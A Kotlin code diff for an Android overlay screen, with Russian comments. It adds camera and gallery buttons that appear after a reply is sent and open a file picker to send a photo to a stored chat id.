@@ -35,6 +35,7 @@ class OverlayActivity : Activity() {
     private lateinit var inputField: EditText
     private lateinit var actionBtn: Button
     private lateinit var progressView: TextView
+    private lateinit var fileButtonsLayout: LinearLayout
 
     // ── Состояние ─────────────────────────────────────────────────────────────
     private var mode            = "plain"
@@ -235,6 +236,10 @@ class OverlayActivity : Activity() {
         progressView.visibility = View.GONE
         actionBtn.text          = "ОК"
         actionBtn.setOnClickListener { finishAndRemoveTask() }
+        // Показываем кнопки отправки фото если есть chat_id
+        if (uploadChatId.isNotEmpty()) {
+            fileButtonsLayout.visibility = View.VISIBLE
+        }
     }
 
     // ── UI Builder ────────────────────────────────────────────────────────────
@@ -319,12 +324,50 @@ class OverlayActivity : Activity() {
             LinearLayout.LayoutParams.MATCH_PARENT,
             LinearLayout.LayoutParams.WRAP_CONTENT).also { it.bottomMargin = 0 }
 
-        cardView.addView(titleView,    lp())
-        cardView.addView(subtitleView, lp())
-        cardView.addView(progressView, lp())
+        // Кнопки файлов (камера / галерея) — показываются после отправки ответа
+        fileButtonsLayout = LinearLayout(this).apply {
+            orientation = LinearLayout.HORIZONTAL
+            visibility  = View.GONE
+            setPadding(0, dp(12), 0, 0)
+        }
+        val btnCamera = Button(this).apply {
+            text      = "📷 Камера"
+            textSize  = 14f
+            setTextColor(Color.WHITE)
+            background = GradientDrawable(
+                GradientDrawable.Orientation.LEFT_RIGHT,
+                intArrayOf(0xFF1A1A2E.toInt(), 0xFF0F3460.toInt())
+            ).apply { cornerRadius = dp(12).toFloat(); setStroke(dp(1), 0x44FFFFFF) }
+            isAllCaps = false
+            setOnClickListener {
+                FilePickerActivity.startCamera(this@OverlayActivity, uploadChatId)
+            }
+        }
+        val btnGallery = Button(this).apply {
+            text      = "🖼 Галерея"
+            textSize  = 14f
+            setTextColor(Color.WHITE)
+            background = GradientDrawable(
+                GradientDrawable.Orientation.LEFT_RIGHT,
+                intArrayOf(0xFF1A1A2E.toInt(), 0xFF0F3460.toInt())
+            ).apply { cornerRadius = dp(12).toFloat(); setStroke(dp(1), 0x44FFFFFF) }
+            isAllCaps = false
+            setOnClickListener {
+                FilePickerActivity.startGallery(this@OverlayActivity, uploadChatId)
+            }
+        }
+        val halfLp = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
+            .also { it.marginEnd = dp(8) }
+        fileButtonsLayout.addView(btnCamera, halfLp)
+        fileButtonsLayout.addView(btnGallery, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))
+
+        cardView.addView(titleView,       lp())
+        cardView.addView(subtitleView,    lp())
+        cardView.addView(progressView,    lp())
         cardView.addView(divider)
-        cardView.addView(inputLayout,  lp())
-        cardView.addView(actionBtn,    lp())
+        cardView.addView(inputLayout,     lp())
+        cardView.addView(actionBtn,       lp())
+        cardView.addView(fileButtonsLayout, lp())
 
         val cardParams = android.widget.FrameLayout.LayoutParams(
             (resources.displayMetrics.widthPixels * 0.88).toInt(),
